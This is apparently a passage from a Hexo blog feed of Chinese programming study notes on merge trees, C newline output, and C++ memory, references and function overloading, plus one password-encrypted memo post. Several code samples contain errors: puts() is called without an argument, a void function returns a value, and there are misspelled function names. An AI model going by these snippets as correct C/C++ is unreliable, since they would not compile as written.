<h4 id="构造最佳归并树（类哈夫曼树）"><a href="#构造最佳归并树（类哈夫曼树）" class="headerlink" title="构造最佳归并树（类哈夫曼树）"></a>构造最佳归并树（类哈夫曼树）</h4><p>先选择最小的两个，组合后再选择两个小的，依次选择即可</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014419470.png"
                      alt="image-20241021014419470"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014502303.png"
                      alt="image-20241021014502303"
                ></p>
<h4 id="多路归并的注意事项"><a href="#多路归并的注意事项" class="headerlink" title="多路归并的注意事项"></a>多路归并的注意事项</h4><p>当k叉归并时，节点数不满足完美归并树，则添加虚段进行归并</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014608970.png"
                      alt="image-20241021014608970"
                ></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014621779.png"
                      alt="image-20241021014621779"
                ></p>
<h5 id="求虚段数量"><a href="#求虚段数量" class="headerlink" title="求虚段数量"></a>求虚段数量</h5><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014712343.png"
                      alt="image-20241021014712343"
                ></p>
<h4 id="总结-17"><a href="#总结-17" class="headerlink" title="总结"></a>总结</h4><p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E5%B8%B8%E8%A7%81%E7%AE%97%E6%B3%95%E5%BD%92%E7%BA%B3/image-20241021014727008.png"
                      alt="image-20241021014727008"
                ></p>
<hr>
<h2 id="声明"><a href="#声明" class="headerlink" title="声明"></a>声明</h2><p>以上示例图来自<a class="link"   href="https://www.bilibili.com/video/BV1b7411N798/" >王道数据结构 <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></p>
<p>&#x3D;&#x3D;本博客所有内容均为学习所用，未经允许不可进行商业转载&#x3D;&#x3D;</p>
]]></content>
      <categories>
        <category>数据结构</category>
      </categories>
      <tags>
        <tag>数据结构</tag>
        <tag>算法</tag>
      </tags>
  </entry>
  <entry>
    <title>C语言的一些代码小技巧</title>
    <url>/2024/09/11/C%E8%AF%AD%E8%A8%80/%E5%9F%BA%E7%A1%80%E9%83%A8%E5%88%86/%E5%B0%8F%E6%8A%80%E5%B7%A7/</url>
    <content><![CDATA[<h1 id="C语言中的代码小技巧"><a href="#C语言中的代码小技巧" class="headerlink" title="C语言中的代码小技巧"></a>C语言中的代码小技巧</h1><h2 id="1、输出一个回车符号"><a href="#1、输出一个回车符号" class="headerlink" title="1、输出一个回车符号"></a>1、输出一个回车符号</h2><div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">putchar</span>(<span class="number">10</span>);	<span class="comment">//表示输出一个回车符号</span></span><br></pre></td></tr></table></figure></div>

<p>putchar()函数表示直接输出一个字符，（）内可以填写一个字符；也可以填写其ASCII码（一个整数），然后系统将其转化为字符输出</p>
<p>而ASCII中的10对应的是line feed(换行)，所以改语句才实现了换行功能</p>
<p>当然也可以直接</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br></pre></td></tr></table></figure></div>

<p>或者</p>
<div class="highlight-container" data-rel="C"><figure class="iseeu highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">puts</span>();</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>解释</p>
</blockquote>
<p>putchar();输出的是字符，但不自带换行功能。</p>
<p>puts();自带换行功能，将结尾\0换成\n。</p>
<hr>
<h2 id=""><a href="#" class="headerlink" title=""></a></h2>]]></content>
      <categories>
        <category>C语言</category>
        <category>基础部分</category>
      </categories>
      <tags>
        <tag>C语言</tag>
        <tag>技巧</tag>
      </tags>
  </entry>
  <entry>
    <title>云服务器</title>
    <url>/2024/09/10/%E5%A4%87%E5%BF%98%E5%BD%95/%E4%BA%91%E6%9C%8D%E5%8A%A1%E5%99%A8/</url>
    <content><![CDATA[
<div class="hbe hbe-container" id="hexo-blog-encrypt" data-wpm="Oh, this is an invalid password. Check and try again, please." data-whm="OOPS, these decrypted content may changed, but you can still have a look.">
  <script id="hbeData" type="hbeData" data-hmacdigest="01623beed1f3152631c2404190b6f38ec45e5209015973c8234b812b3f302185">2c57a2851a68e9855f8788f6d6316468534e195ad74e87259f53b0c03bb99be47473a3f5f9e5e77c7fc153886505447ef95ba1bd306fe121bb7af72b2f151fe82083b308afa6edd9ad5ce1d9c755cfd176b9064c7f303d86dc65ef12eedeb23bcb2a5c88fe2baba53a67b1b7830cd243cd18dc10d2d19e3553e1ebee2a7aa63ec06a33ce56c2811fa97ec915d8b0228a04990e87e2b4e8504cbf1c1bb8a6056b1277c13a5515a0af51883ca0c09eae27608a5d5f7f1dbe54f8b358bc3720979fc1abc8e61f8e2b4061360ba191fe2abec8a119b1c51725c73c1a7817a3edbafe0a7f7fd2a23022cc11f79b0fc2fc430169b83ad498b6d47792c7edff4ad6eb52d680e5d318e91c91a754e71599631657f7c9e7d4b54d77b73a2ef3050e9df98a92068c863bebdd9de0c29b7b38cb6ddd72487e4081d782805d309c91e81466664a1d0c923ee6bb8bcabf8545dd8fda13de0fea1236d90ef8f80267f1fa8ca8ef953caec07faf4f1056bd1804b4c8aa1ccdc9c06980a0ccfa22ef6970211a9d56ed63dec6c95de3a9cf03eb83853b819a4060d8e92f9e3fd36840fd8e3ede22cd35a8800d4a38dcb81045f98c7b59f6e47d39f90754a887dc5b70f017382ff6040ab63a3a5663adb87ba6975176daa18251a8471bab979a737fa8517d3889f7b2af9d65c25b160056d99ec0728b3e4c742ae8c411f78a063f7a84bce14b4633141780db71813538e437ce3e16ecbe51375844ae6c9570b7516cf140904255c53a65fe7fb5c562a9b656038ead2c584e931e9cfb0b8abd01fbede4d66a441cc6f638a87ccbb4652ee8bd645402a0ab1c0214461bd3a306241f3ed0916af121f5e3</script>
  <div class="hbe hbe-content">
    <div class="hbe hbe-input hbe-input-default">
      <input class="hbe hbe-input-field hbe-input-field-default" type="password" id="hbePass">
      <label class="hbe hbe-input-label hbe-input-label-default" for="hbePass">
        <span class="hbe hbe-input-label-content hbe-input-label-content-default">Hey, password is required here.</span>
      </label>
    </div>
  </div>
</div>
<link href="/css/hbe.style.css" rel="stylesheet" type="text/css"><script data-swup-reload-script type="module" src="/js/plugins/hbe.js"></script>
<script data-swup-reload-script type="module">
import {initHBE} from "/js/plugins/hbe.js";
  console.log("hexo-blog-encrypt: loaded.");
    initHBE();
</script>
]]></content>
      <categories>
        <category>备忘录</category>
      </categories>
      <tags>
        <tag>备忘录</tag>
      </tags>
  </entry>
  <entry>
    <title>C++核心编程部分总结</title>
    <url>/2024/10/23/C++/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/</url>
    <content><![CDATA[<h1 id="C-核心编程部分总结"><a href="#C-核心编程部分总结" class="headerlink" title="C++核心编程部分总结"></a>C++核心编程部分总结</h1><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>基于已经学习过C语言&#x2F;C++基础部分的进阶部分，主要是面向对象的提升</p>
<h2 id="1-内存存放"><a href="#1-内存存放" class="headerlink" title="1 内存存放"></a>1 内存存放</h2><h3 id="1-1-变量的存放区域"><a href="#1-1-变量的存放区域" class="headerlink" title="1.1 变量的存放区域"></a>1.1 变量的存放区域</h3><p>局部变量和局部常量存放在当前函数的栈区</p>
<p>全局变量和静态变量都在全局区</p>
<p>常量在接近全局区的常量区</p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/image-20241023164153955.png"
                      alt="image-20241023164153955"
                ></p>
<p><strong>代码实现案例</strong></p>
<p><img  
                     lazyload
                     src="/images/loading.svg"
                     data-src="/./../../images/%E6%A0%B8%E5%BF%83%E9%83%A8%E5%88%86%E6%80%BB%E7%BB%93/1545017602518.png"
                      alt="1545017602518"
                ></p>
<p>即：</p>
<ul>
<li>全局区中存放全局变量、静态变量、常量</li>
<li>常量区中存放 const修饰的全局常量  和 字符串常量</li>
</ul>
<h3 id="1-2-堆区"><a href="#1-2-堆区" class="headerlink" title="1.2 堆区"></a>1.2 堆区</h3><p>在C++中可以利用<code>关键词new</code>在堆区开辟内存</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>* <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* a = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);<span class="comment">//开辟单个数据</span></span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span>* arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];<span class="comment">//开辟整个数组</span></span><br></pre></td></tr></table></figure></div>

<p>这里面的a指针就存放在栈区与全局区外的堆区，可以理解为另一个存放变量的地方</p>
<p><strong>new：</strong>就是将值进行拷贝，并将地址在堆区新开辟一个，通过访问地址就可以访问值了</p>
<p><strong>堆区：由程序员分配释放,若程序员不释放,程序结束时由操作系统回收</strong></p>
<p>在C++中可以利用<code>关键词delete</code>手动释放在堆区开辟的内存，释放数组的时候需要加上[]，<code>delete[] 数组名;</code></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//开辟数</span></span><br><span class="line"><span class="function"><span class="type">int</span>* <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	<span class="type">int</span>* a = <span class="keyword">new</span> <span class="built_in">int</span>(<span class="number">10</span>);</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="type">int</span> *p = <span class="built_in">func</span>();</span><br><span class="line"></span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; *p &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//利用delete释放堆区数据</span></span><br><span class="line">	<span class="keyword">delete</span> p;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//cout &lt;&lt; *p &lt;&lt; endl; //报错，释放的空间不可访问</span></span><br><span class="line"><span class="comment">//开辟数组</span></span><br><span class="line">    <span class="type">int</span>* arr = <span class="keyword">new</span> <span class="type">int</span>[<span class="number">10</span>];</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		arr[i] = i + <span class="number">100</span>;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++)</span><br><span class="line">	&#123;</span><br><span class="line">		cout &lt;&lt; arr[i] &lt;&lt; endl;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="comment">//释放数组 delete 后加 []</span></span><br><span class="line">	<span class="keyword">delete</span>[] arr;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="2-引用类型"><a href="#2-引用类型" class="headerlink" title="2 引用类型"></a>2 引用类型</h2><h3 id="2-1-引用概念"><a href="#2-1-引用概念" class="headerlink" title="2.1 引用概念"></a>2.1 引用概念</h3><p><strong>引用类型</strong>：<code>&amp;</code></p>
<p>**作用： **给变量起别名，在函数中引用是可以作为函数的返回值存在的</p>
<p><strong>语法：</strong> <code>数据类型 &amp;别名 = 原名</code></p>
<p><strong>本质：</strong>内容的指针常量，<code>int&amp; b=a;</code> 等于 <code>int* const b =&amp;a;</code>，前者表示给a起别名为b，后者表示给a的地址新定义为一个指针常量b，则用星号解析b的时候就等于a，而在c++中，别名后想要用该别名，就不用每次都星号解析，直接用即可</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//发现是引用，转换为 int* const ref = &amp;a;</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span>&amp; ref)</span></span>&#123;</span><br><span class="line">	ref = <span class="number">100</span>; <span class="comment">// ref是引用，转换为*ref = 100</span></span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">    <span class="comment">//自动转换为 int* const ref = &amp;a;</span></span><br><span class="line">    <span class="comment">//指针常量是指针指向不可改，也说明为什么引用不可更改</span></span><br><span class="line">	<span class="type">int</span>&amp; ref = a; </span><br><span class="line">	ref = <span class="number">20</span>; <span class="comment">//内部发现ref是引用，自动帮我们转换为: *ref = 20;</span></span><br><span class="line">    </span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;a:&quot;</span> &lt;&lt; a &lt;&lt; endl;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref:&quot;</span> &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line">    </span><br><span class="line">	<span class="built_in">func</span>(a);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="2-2-注意事项"><a href="#2-2-注意事项" class="headerlink" title="2.2 注意事项"></a>2.2 注意事项</h3><ul>
<li><p>引用必须初始化</p>
</li>
<li><p>引用在初始化后，不可以改变</p>
</li>
<li><p>在函数中不能返回局部变量引用</p>
<blockquote>
<p>如果在函数中返回了局部变量引用，第一次系统会默认调用局部变量，是为了防止出错，而第二次则会传入随机地址，表示栈区没有对应的值（目前的最新ide已经不支持了）</p>
</blockquote>
</li>
</ul>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line"><span class="type">int</span> b = <span class="number">20</span>;</span><br><span class="line"><span class="comment">//int &amp;c; //错误，引用必须初始化</span></span><br><span class="line"><span class="type">int</span> &amp;c = a; <span class="comment">//一旦初始化后，就不可以更改</span></span><br><span class="line">c = b; <span class="comment">//这是赋值操作，不是更改引用</span></span><br><span class="line"><span class="comment">//即b赋值给c和a，而不是将别名改为b</span></span><br><span class="line"><span class="comment">//-------------------------------------------------</span></span><br><span class="line"><span class="comment">//返回局部变量引用</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">test01</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>; <span class="comment">//局部变量</span></span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//返回静态变量引用</span></span><br><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">test02</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> a = <span class="number">20</span>; <span class="comment">//静态变量，存在全局区</span></span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">mian</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line"><span class="comment">//不能返回局部变量的引用</span></span><br><span class="line">	<span class="type">int</span>&amp; ref = <span class="built_in">test01</span>();</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line">    <span class="comment">//第一次可以被调用（目前的最新ide已经不支持了）</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref = &quot;</span> &lt;&lt; ref &lt;&lt; endl;<span class="comment">//第二次不行</span></span><br><span class="line"></span><br><span class="line">	<span class="comment">//如果函数做左值，那么必须返回引用</span></span><br><span class="line">	<span class="type">int</span>&amp; ref2 = <span class="built_in">test02</span>();</span><br><span class="line">	<span class="built_in">test02</span>() = <span class="number">1000</span>;</span><br><span class="line">    cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;<span class="comment">//两次都是1000</span></span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;ref2 = &quot;</span> &lt;&lt; ref2 &lt;&lt; endl;<span class="comment">//两次都是1000</span></span><br><span class="line">    <span class="comment">//因为将值传给了引用类型函数</span></span><br><span class="line">    <span class="comment">//则test02() = 1000;就等于a=1000，是可以被执行的</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h3 id="2-3-引用与函数"><a href="#2-3-引用与函数" class="headerlink" title="2.3 引用与函数"></a>2.3 引用与函数</h3><h4 id="2-3-1-引用传递"><a href="#2-3-1-引用传递" class="headerlink" title="2.3.1 引用传递"></a>2.3.1 引用传递</h4><p>当函数中的参数为引用类型时，即表示当传入参数时，参数被别名，当修改别名的内容时，原传入的参数也会一起被修改</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引用传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap03</span><span class="params">(<span class="type">int</span>&amp; a, <span class="type">int</span>&amp; b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>在平时使用的过程中，也可以用过传入指针来通过改变指针，来改变值</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//地址传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap02</span><span class="params">(<span class="type">int</span>* a, <span class="type">int</span>* b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = *a;</span><br><span class="line">	*a = *b;</span><br><span class="line">	*b = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<p>但是不可以传入空的值，这样表示单独在函数中开辟的新局部变量，不会直接影响传入的参数</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//值传递</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">mySwap01</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b)</span> </span>&#123;</span><br><span class="line">	<span class="type">int</span> temp = a;</span><br><span class="line">	a = b;</span><br><span class="line">	b = temp;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<blockquote>
<p>通过引用参数产生的效果同按地址传递是一样的。引用的语法更清楚简单</p>
</blockquote>
<h4 id="2-3-2-引用返回值"><a href="#2-3-2-引用返回值" class="headerlink" title="2.3.2 引用返回值"></a>2.3.2 引用返回值</h4><p>引用还可以作为函数返回值被赋值，即作为左值</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">int</span>&amp; <span class="title">test</span><span class="params">()</span> </span>&#123;</span><br><span class="line">	<span class="type">static</span> <span class="type">int</span> a = <span class="number">20</span>;</span><br><span class="line">	<span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">test</span>() = <span class="number">1000</span>;</span><br></pre></td></tr></table></figure></div>

<h4 id="2-3-3-常量引用"><a href="#2-3-3-常量引用" class="headerlink" title="2.3.3 常量引用"></a>2.3.3 常量引用</h4><p><strong>通过const修饰引用形参，防止形参改变实参</strong></p>
<p><strong>用在非函数场景是可以防止变量被朽败</strong></p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//引用使用的场景，通常用来修饰形参</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">showValue</span><span class="params">(<span class="type">const</span> <span class="type">int</span>&amp; v)</span> </span>&#123;</span><br><span class="line">	<span class="comment">//v += 10;</span></span><br><span class="line">	cout &lt;&lt; v &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//int&amp; ref = 10;  引用本身需要一个合法的内存空间，因此这行错误</span></span><br><span class="line">	<span class="comment">//加入const就可以了，编译器优化代码，int temp = 10; const int&amp; ref = temp;</span></span><br><span class="line">	<span class="type">const</span> <span class="type">int</span>&amp; ref = <span class="number">10</span>;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//ref = 100;  //加入const后不可以修改变量</span></span><br><span class="line">	cout &lt;&lt; ref &lt;&lt; endl;</span><br><span class="line"></span><br><span class="line">	<span class="comment">//函数中利用常量引用防止误操作修改实参</span></span><br><span class="line">	<span class="type">int</span> a = <span class="number">10</span>;</span><br><span class="line">	<span class="built_in">showValue</span>(a);</span><br><span class="line"></span><br><span class="line">	<span class="built_in">system</span>(<span class="string">&quot;pause&quot;</span>);</span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h2 id="3-函数进阶"><a href="#3-函数进阶" class="headerlink" title="3 函数进阶"></a>3 函数进阶</h2><h3 id="3-1-函数传参"><a href="#3-1-函数传参" class="headerlink" title="3.1 函数传参"></a>3.1 函数传参</h3><h4 id="3-1-1-占位参数"><a href="#3-1-1-占位参数" class="headerlink" title="3.1.1 占位参数"></a>3.1.1 占位参数</h4><p>当函数传入的参数没有具体字面量时，表示占位参数，可以在类中的构造函数中起到作用</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">int</span> a,<span class="type">int</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> a;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">	<span class="built_in">test</span>(<span class="number">11</span>,<span class="number">1</span>); <span class="comment">//占位参数必须填补</span></span><br><span class="line"></span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="3-1-2-默认参数"><a href="#3-1-2-默认参数" class="headerlink" title="3.1.2 默认参数"></a>3.1.2 默认参数</h4><p>函数包含参数，并给参数赋值，则在函数调用时可以不用传入那个参数的值</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func2</span><span class="params">(<span class="type">int</span> a, <span class="type">int</span> b = <span class="number">10</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func2(int a, int b = 10) 调用&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">int</span> <span class="title">main</span><span class="params">()</span></span>&#123;</span><br><span class="line">    </span><br><span class="line">    <span class="built_in">fun2</span>(<span class="number">1</span>);<span class="comment">//只传入一个参数即可</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>

<h4 id="3-1-3-防修改参数"><a href="#3-1-3-防修改参数" class="headerlink" title="3.1.3 防修改参数"></a>3.1.3 防修改参数</h4><p>当函数参数中加入const关键词时，可以防止参数被修改</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">test</span><span class="params">(<span class="type">const</span> <span class="type">int</span>&amp; a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure></div>

<h3 id="3-2-函数重载"><a href="#3-2-函数重载" class="headerlink" title="3.2 函数重载"></a>3.2 函数重载</h3><p><strong>概念：</strong>将函数命重复利用，但效果不同，即实现重载，但不覆盖</p>
<p><strong>作用：</strong>函数名可以相同，提高复用性</p>
<p><strong>函数重载满足条件：</strong></p>
<ul>
<li><p>同一个作用域下</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数同在全局作用域</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>函数名称相同</p>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="comment">//函数名相同</span></span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></div>
</li>
<li><p>函数参数<strong>类型不同</strong>  或者 <strong>个数不同</strong> 或者 <strong>顺序不同</strong></p>
<blockquote>
<p>引用类型和指针类型也是类型不同</p>
</blockquote>
<div class="highlight-container" data-rel="C++"><figure class="iseeu highlight c++"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a ,<span class="type">int</span> b)</span><span class="comment">//函数参数个数不同</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a ,int b) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a ,<span class="type">int</span>&amp; b)</span><span class="comment">//函数参数类型不同</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a ,int&amp; b) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a ,<span class="type">int</span>* b)</span><span class="comment">//函数参数类型不同</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a ,int* b) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">int</span> a ,<span class="type">double</span> b)</span><span class="comment">//函数参数类型不同</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">	cout &lt;&lt; <span class="string">&quot;func (int a ,double b) 的调用！&quot;</span> &lt;&lt; endl;</span><br><span class="line">&#125;</span><br><span class="line"><span class="function"><span class="type">void</span> <span class="title">func</span><span class="params">(<span class="type">double</span> a ,<span class="type">int</span> b)</span><span 